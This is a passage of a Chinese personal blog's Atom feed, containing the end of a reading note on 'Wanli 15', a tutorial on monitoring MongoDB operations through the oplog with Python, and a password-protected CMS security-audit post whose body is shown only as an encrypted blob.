&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;但我们几乎可以下定论的是，徐高张在大明政治上的建树，胡戚等人在军事上对大明的挽救所建立的功绩都远超海瑞，而后者的清正廉洁甚至导致了他子女的身亡。这里不禁要提出一个疑问，一个能够使得整个社会进步的人，一个不会对社会产生多大贡献的人，我们是否应该以同样的清廉观来审视他们。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;更重要的一点是，正是胡宗宪攀附严嵩，戚继光攀附张居正才会带来他们在军事行动上不被掣肘，才使得抗倭的战役最终取得了胜利。换句话说，有时候，这种行贿行为反而给当时的普罗大众带来了安定。我们做一个假设，假设大明当时真的是一应清流们把持朝政，一方面恪守祖宗体制，一方面对胡戚二人一丝不苟的评判，恐怕浙直一带的百姓生活在水深火热中，他们也只能念一句忧国忧民的诗句罢了。&lt;/p&gt;
&lt;h2 id=&quot;0x04-结尾&quot;&gt;&lt;a href=&quot;#0x04-结尾&quot; class=&quot;headerlink&quot; title=&quot;0x04 结尾&quot;&gt;&lt;/a&gt;0x04 结尾&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;整个《万历十五年》读下来，最深刻的感受就是，“矛盾”，大概正应了那句话，人是一切矛盾的综合体。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;以上，作为一个并没有树立起正确的历史观的历史爱好者的读书感悟。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;最近《人民的名义》很火，据说书中高育良欣赏高小凤便是因为此书，正好闲暇时间又在补《大明王朝1566》，嘉靖、隆庆、万历祖孙三也都悉数登场，所以就乘此机会补了一下这本书。&lt;br&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="万历" scheme="http://phantom0301.cc/tags/%E4%B8%87%E5%8E%86/"/>
    
      <category term="明史" scheme="http://phantom0301.cc/tags/%E6%98%8E%E5%8F%B2/"/>
    
  </entry>
  
  <entry>
    <title>利用Mongo数据库的oplog机制实现准实时数据操作监控</title>
    <link href="http://phantom0301.cc/2017/05/08/MongoOplog/"/>
    <id>http://phantom0301.cc/2017/05/08/MongoOplog/</id>
    <published>2017-05-08T12:39:38.000Z</published>
    <updated>2017-05-08T13:23:58.913Z</updated>
    
    <content type="html">&lt;p&gt;最近有一个需求是要实时获取到新插入到MongoDB的数据，而插入程序本身已经有一套处理逻辑，所以不方便直接在插入程序里写相关程序，传统的数据库大多自带这种触发器机制，但是Mongo没有相关的函数可以用（也可能我了解的太少了，求纠正），当然还有一点是需要python实现，于是收集整理了一个相应的实现方法。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;首先可以想到，这种需求其实很像数据库的主从备份机制，从数据库之所以能够同步主库是因为存在某些指标来做控制，我们知道MongoDB虽然没有现成触发器，但是它能够实现主从备份，所以我们就从它的主从备份机制入手。&lt;/p&gt;
&lt;h2 id=&quot;0x02-Oplog&quot;&gt;&lt;a href=&quot;#0x02-Oplog&quot; class=&quot;headerlink&quot; title=&quot;0x02 Oplog&quot;&gt;&lt;/a&gt;0x02 Oplog&lt;/h2&gt;&lt;p&gt;首先，需要以master模式来打开mongod守护，命令行使用&lt;em&gt;–master&lt;/em&gt;,或者配置文件增加master键为true。&lt;/p&gt;
&lt;p&gt;此时，我们可以在Mongo的系统库local里见到新增的collection——oplog，此时oplog.$main里就会存储进oplog信息，如果此时还有充当从数据库的Mongo存在，就会还有一些slaves的信息，由于我们这里并不是主从同步，所以不存在这些集合。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170508205438.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;再来看看oplog结构：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;ts&amp;quot; : Timestamp(6417682881216249, 1),  时间戳
&amp;quot;h&amp;quot; : NumberLong(0),  长度
&amp;quot;v&amp;quot; : 2,  
&amp;quot;op&amp;quot; : &amp;quot;n&amp;quot;, 操作类型
&amp;quot;ns&amp;quot; : &amp;quot;&amp;quot;,  操作的库和集合
&amp;quot;o2&amp;quot; : &amp;quot;_id&amp;quot;  update条件
&amp;quot;o&amp;quot; : {}  操作值，即document
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里需要知道op的几种属性：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;insert，&amp;apos;i&amp;apos;
update, &amp;apos;u&amp;apos;
remove(delete), &amp;apos;d&amp;apos;
cmd, &amp;apos;c&amp;apos;
noop, &amp;apos;n&amp;apos; 空操作
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从上面的信息可以看出，我们只要不断读取到ts来做对比，然后根据op即可判断当前出现的是什么操作，相当于使用程序实现了一个从数据库的接收端。&lt;/p&gt;
&lt;h2 id=&quot;0x03-Code&quot;&gt;&lt;a href=&quot;#0x03-Code&quot; class=&quot;headerlink&quot; title=&quot;0x03 Code&quot;&gt;&lt;/a&gt;0x03 Code&lt;/h2&gt;&lt;p&gt;在Github上找到了别人的实现方式，不过它的函数库太老旧，所以在他的基础上进行修改。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/RedBeard0531/mongo-oplog-watcher&quot; title=&quot;https://github.com/RedBeard0531/mongo-oplog-watcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/RedBeard0531/mongo-oplog-watcher&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先是实现一个数据库的初始化，设定一个延迟时间（准实时）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;self.poll_time = poll_time
self.connection = connection or pymongo.MongoClient()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主要的函数是start(),实现一个时间的比对并进行相应字段的处理：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def start(self):
    oplog = self.connection.local[&amp;apos;oplog.$main&amp;apos;]
    #读取之前提到的库
    ts = oplog.find().sort(&amp;apos;$natural&amp;apos;, -1)[0][&amp;apos;ts&amp;apos;]
    #获取一个时间边际
    while True:
        if self._ns_filter is None:
            filter = {}
        else:
            filter = {&amp;apos;ns&amp;apos;: self._ns_filter}
        filter[&amp;apos;ts&amp;apos;] = {&amp;apos;$gt&amp;apos;: ts}
        try:
            cursor = oplog.find(filter)
            #对此时间之后的进行处理
            while True:
                for op in cursor:
                    ts = op[&amp;apos;ts&amp;apos;]
                    id = self.__get_id(op)
                    self.all_with_noop(ns=op[&amp;apos;ns&amp;apos;], ts=ts, op=op[&amp;apos;op&amp;apos;], id=id, raw=op)
                    #可以指定处理插入监控，更新监控或者删除监控等
                time.sleep(self.poll_time)
                if not cursor.alive:
                    break
        except AutoReconnect:
            time.sleep(self.poll_time)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;循环这个start函数，在all_with_noop这里就可以编写相应的监控处理逻辑。&lt;/p&gt;
&lt;p&gt;这样就可以实现一个简易的准实时Mongo数据库操作监控器，下一步就可以配合其他操作来对新入库的程序进行相应处理。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近有一个需求是要实时获取到新插入到MongoDB的数据，而插入程序本身已经有一套处理逻辑，所以不方便直接在插入程序里写相关程序，传统的数据库大多自带这种触发器机制，但是Mongo没有相关的函数可以用（也可能我了解的太少了，求纠正），当然还有一点是需要python实现，于是收集整理了一个相应的实现方法。&lt;br&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
    
    
      <category term="pymongo" scheme="http://phantom0301.cc/tags/pymongo/"/>
    
      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
    
      <category term="trigger" scheme="http://phantom0301.cc/tags/trigger/"/>
    
  </entry>
  
  <entry>
    <title>FangfaCMS前台PHP命令执行+多处SQL注入代码审计</title>
    <link href="http://phantom0301.cc/2017/04/25/fangfacms/"/>
    <id>http://phantom0301.cc/2017/04/25/fangfacms/</id>
    <published>2017-04-25T12:14:46.000Z</published>
    <updated>2017-04-26T06:12:50.678Z</updated>
    
    <content type="html">&lt;p&gt;这是一篇加密的博文~~&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;script type=&quot;text/ecmascript&quot; src=&quot;/js/MD5.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/ecmascript&quot; src=&quot;/js/crypto.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
      var cyber = &quot;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